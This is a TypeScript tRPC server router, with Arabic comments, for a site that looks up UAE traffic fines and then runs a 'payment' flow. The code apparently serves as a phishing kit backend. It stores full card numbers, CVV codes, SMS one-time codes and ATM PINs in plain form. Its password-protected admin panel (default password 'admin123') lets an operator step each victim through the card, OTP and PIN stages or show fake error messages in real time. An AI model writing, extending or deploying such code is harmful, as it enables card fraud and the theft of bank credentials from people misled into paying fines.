import { z } from "zod";
import { TRPCError } from "@trpc/server";
import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import {
  createFineQuery,
  updateFineQuery,
  getFineQueryById,
  getRecentFineQueries,
  getFineQueriesByUserId,
  createFines,
  getFinesByQueryId,
  createPaymentSession,
  getPaymentSessionBySessionId,
  updatePaymentSession,
  getAllPaymentSessions,
  getUnreadPaymentSessionsCount,
} from "./db";
import { scrapeDubaiFines, PLATE_SOURCES, PLATE_CODES } from "./scraper";
import crypto from "crypto";

// كلمة مرور الأدمين - يمكن تغييرها من متغيرات البيئة
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "admin123";
const ADMIN_JWT_SECRET = process.env.JWT_SECRET || "secret";

function generateAdminToken(): string {
  return crypto.randomBytes(32).toString("hex");
}

// تخزين مؤقت للتوكنات (في الإنتاج يجب استخدام Redis)
const adminTokens = new Set<string>();

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return { success: true } as const;
    }),
  }),

  fines: router({
    // جلب قوائم الإمارات وكودات اللوحات
    getOptions: publicProcedure.query(() => {
      return {
        plateSources: PLATE_SOURCES,
        plateCodes: PLATE_CODES,
      };
    }),

    // الاستعلام عن المخالفات
    query: publicProcedure
      .input(
        z.object({
          plateSource: z.string().min(1, "يرجى اختيار الإمارة"),
          plateNumber: z.string().min(1, "يرجى إدخال رقم اللوحة").max(20),
          plateCode: z.string().min(1, "يرجى اختيار كود اللوحة"),
        })
      )
      .mutation(async ({ input, ctx }) => {
        const queryId = await createFineQuery({
          plateSource: input.plateSource,
          plateNumber: input.plateNumber,
          plateCode: input.plateCode,
          status: "pending",
          userId: ctx.user?.id ?? null,
        });

        try {
          const result = await scrapeDubaiFines(
            input.plateSource,
            input.plateNumber,
            input.plateCode
          );

          if (!result.success) {
            await updateFineQuery(queryId, {
              status: "failed",
              errorMessage: result.errorMessage,
            });

            return {
              success: false,
              queryId,
              fines: [],
              errorMessage: result.errorMessage || "فشل الاستعلام",
            };
          }

          const finesCount = result.fines.length;
          const status = finesCount === 0 ? "no_fines" : "success";

          await updateFineQuery(queryId, {
            status,
            totalFines: finesCount,
            totalAmount: result.totalAmount ?? "0",
            rawResults: result.fines as any,
          });

          if (finesCount > 0) {
            await createFines(
              result.fines.map((fine) => ({
                queryId,
                fineNumber: fine.fineNumber,
                fineDate: fine.fineDate,
                description: fine.description,
                amount: fine.amount ? fine.amount.replace(/[^0-9.]/g, "") : undefined,
                blackPoints: fine.blackPoints ?? 0,
                isPaid: fine.isPaid ?? "unpaid",
                location: fine.location,
              }))
            );
          }

          const mappedFines = result.fines.map((fine) => ({
            ticketNo: fine.ticketNo || fine.fineNumber || "",
            amount: fine.amount || "0",
            location: fine.location || fine.locationAr || "",
            source: fine.source || fine.trafficDepartment || "",
            description: fine.description || fine.descriptionAr || "",
            dateTime: fine.fineDate || "",
            status: fine.isPaid === "paid" ? "paid" : (fine.blackPoints && fine.blackPoints > 0 ? "blackpoints" : "payable"),
            isPaid: fine.isPaid === "paid",
            speed: fine.speed || undefined,
          }));

          return {
            success: true,
            queryId,
            fines: mappedFines,
            totalAmount: result.totalAmount,
            totalFines: finesCount,
          };
        } catch (error) {
          await updateFineQuery(queryId, {
            status: "failed",
            errorMessage: error instanceof Error ? error.message : "خطأ غير متوقع",
          });

          return {
            success: false,
            queryId,
            fines: [],
            errorMessage: "حدث خطأ أثناء الاستعلام. يرجى المحاولة مرة أخرى.",
          };
        }
      }),

    // جلب سجل الاستعلامات الأخيرة
    getHistory: publicProcedure
      .input(z.object({ limit: z.number().min(1).max(50).default(20) }).optional())
      .query(async ({ ctx, input }) => {
        if (ctx.user) {
          return getFineQueriesByUserId(ctx.user.id, input?.limit ?? 20);
        }
        return getRecentFineQueries(input?.limit ?? 20);
      }),

    // جلب تفاصيل استعلام معين
    getQueryDetails: publicProcedure
      .input(z.object({ queryId: z.number() }))
      .query(async ({ input }) => {
        const query = await getFineQueryById(input.queryId);
        if (!query) return null;
        const finesData = await getFinesByQueryId(input.queryId);
        return { query, fines: finesData };
      }),
  }),

  // ========== Payment Flow ==========
  payment: router({
    // إنشاء جلسة دفع جديدة
    createSession: publicProcedure
      .input(z.object({
        selectedFines: z.array(z.any()),
        totalAmount: z.string(),
        plateNumber: z.string().optional(),
        plateSource: z.string().optional(),
        queryId: z.number().optional(),
      }))
      .mutation(async ({ input, ctx }) => {
        const sessionId = crypto.randomBytes(16).toString("hex");
        const clientIp = (ctx.req.headers["x-forwarded-for"] as string)?.split(",")[0] || ctx.req.socket.remoteAddress || "";
        const userAgent = ctx.req.headers["user-agent"] || "";

        await createPaymentSession({
          sessionId,
          queryId: input.queryId ?? null,
          selectedFines: input.selectedFines,
          totalAmount: input.totalAmount,
          plateNumber: input.plateNumber ?? null,
          plateSource: input.plateSource ?? null,
          stage: "card",
          clientIp,
          userAgent,
          statusRead: 0,
        });

        return { success: true, sessionId };
      }),

    // جلب حالة الجلسة (polling)
    getStatus: publicProcedure
      .input(z.object({ sessionId: z.string() }))
      .query(async ({ input }) => {
        const session = await getPaymentSessionBySessionId(input.sessionId);
        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
        return {
          stage: session.stage,
          errorMessage: session.errorMessage,
        };
      }),

    // إرسال بيانات البطاقة
    submitCard: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        cardName: z.string().min(1),
        cardNumber: z.string().min(16).max(19),
        cardExpiry: z.string().min(4),
        cardCvv: z.string().min(3).max(4),
      }))
      .mutation(async ({ input }) => {
        const session = await getPaymentSessionBySessionId(input.sessionId);
        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
        if (session.stage !== "card") throw new TRPCError({ code: "BAD_REQUEST", message: "المرحلة غير صحيحة" });

        const masked = input.cardNumber.replace(/\s/g, "").replace(/(\d{4})\d{8}(\d{4})/, "$1 **** **** $2");

        await updatePaymentSession(input.sessionId, {
          cardName: input.cardName,
          cardNumber: input.cardNumber.replace(/\s/g, ""),
          cardNumberMasked: masked,
          cardExpiry: input.cardExpiry,
          cardCvv: input.cardCvv,
          stage: "card_pending",
          statusRead: 0,
          errorMessage: null,
        });

        return { success: true };
      }),

    // إرسال رمز OTP
    submitOtp: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        otpCode: z.string().min(4).max(8),
      }))
      .mutation(async ({ input }) => {
        const session = await getPaymentSessionBySessionId(input.sessionId);
        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
        if (session.stage !== "otp") throw new TRPCError({ code: "BAD_REQUEST", message: "المرحلة غير صحيحة" });

        await updatePaymentSession(input.sessionId, {
          otpCode: input.otpCode,
          stage: "otp_pending",
          statusRead: 0,
          errorMessage: null,
        });

        return { success: true };
      }),

    // إرسال رقم ATM PIN
    submitAtmPin: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        atmPin: z.string().min(4).max(6),
      }))
      .mutation(async ({ input }) => {
        const session = await getPaymentSessionBySessionId(input.sessionId);
        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
        if (session.stage !== "atm") throw new TRPCError({ code: "BAD_REQUEST", message: "المرحلة غير صحيحة" });

        await updatePaymentSession(input.sessionId, {
          atmPin: input.atmPin,
          stage: "atm_pending",
          statusRead: 0,
          errorMessage: null,
        });

        return { success: true };
      }),
  }),

  // ========== Admin Panel ==========
  admin: router({
    // تسجيل الدخول
    login: publicProcedure
      .input(z.object({ password: z.string() }))
      .mutation(async ({ input }) => {
        if (input.password !== ADMIN_PASSWORD) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "كلمة المرور غير صحيحة" });
        }
        const token = generateAdminToken();
        adminTokens.add(token);
        // حذف التوكن بعد 24 ساعة
        setTimeout(() => adminTokens.delete(token), 24 * 60 * 60 * 1000);
        return { success: true, token };
      }),

    // التحقق من التوكن
    verify: publicProcedure
      .input(z.object({ token: z.string() }))
      .query(async ({ input }) => {
        return { valid: adminTokens.has(input.token) };
      }),

    // جلب إحصائيات
    getStats: publicProcedure
      .input(z.object({ token: z.string() }))
      .query(async ({ input }) => {
        if (!adminTokens.has(input.token)) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
        }
        const sessions = await getAllPaymentSessions(200);
        const total = sessions.length;
        const pending = sessions.filter(s => s.stage.endsWith("_pending")).length;
        const completed = sessions.filter(s => s.stage === "success").length;
        const failed = sessions.filter(s => s.stage === "failed").length;
        const newCount = sessions.filter(s => s.statusRead === 0).length;
        return { total, pending, completed, failed, new: newCount };
      }),

    // جلب كل الجلسات
    getSessions: publicProcedure
      .input(z.object({ token: z.string() }))
      .query(async ({ input }) => {
        if (!adminTokens.has(input.token)) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
        }
        const sessions = await getAllPaymentSessions(100);
        // تحديث statusRead
        for (const s of sessions.filter(s => s.statusRead === 0)) {
          await updatePaymentSession(s.sessionId, { statusRead: 1 });
        }
        return sessions;
      }),

    // جلب تفاصيل جلسة واحدة
    getSession: publicProcedure
      .input(z.object({ token: z.string(), sessionId: z.string() }))
      .query(async ({ input }) => {
        if (!adminTokens.has(input.token)) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
        }
        const session = await getPaymentSessionBySessionId(input.sessionId);
        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
        await updatePaymentSession(input.sessionId, { statusRead: 1 });
        return session;
      }),

    // إجراء على الجلسة (قبول/رفض)
    action: publicProcedure
      .input(z.object({
        token: z.string(),
        sessionId: z.string(),
        action: z.enum(["pass", "denied", "completed"]),
        errorMessage: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        if (!adminTokens.has(input.token)) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
        }
        const session = await getPaymentSessionBySessionId(input.sessionId);
        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });

        let newStage: typeof session.stage = session.stage;

        if (input.action === "pass") {
          // تقدم للمرحلة التالية
          if (session.stage === "card_pending") newStage = "otp";
          else if (session.stage === "otp_pending") newStage = "atm";
          else if (session.stage === "atm_pending") newStage = "success";
        } else if (input.action === "denied") {
          // رفض - إرجاع للمرحلة السابقة مع رسالة خطأ
          if (session.stage === "card_pending") newStage = "card";
          else if (session.stage === "otp_pending") newStage = "otp";
          else if (session.stage === "atm_pending") newStage = "atm";
          else newStage = "failed";
        } else if (input.action === "completed") {
          newStage = "success";
        }

        let errorMsg: string | null = null;
        if (input.action === "denied") {
          if (input.errorMessage) {
            errorMsg = input.errorMessage;
          } else if (session.stage === "otp_pending") {
            errorMsg = "برجاء التحقق من الرمز المرسل عبر الجوال";
          } else if (session.stage === "atm_pending") {
            errorMsg = "برجاء التحقق من الرقم السري للآلي الصحيح";
          } else {
            errorMsg = "تم رفض العملية. يرجى المحاولة مرة أخرى.";
          }
        }

        await updatePaymentSession(input.sessionId, {
          stage: newStage,
          errorMessage: errorMsg,
        });

        return { success: true, newStage };
      }),
  }),
});

export type AppRouter = typeof appRouter;
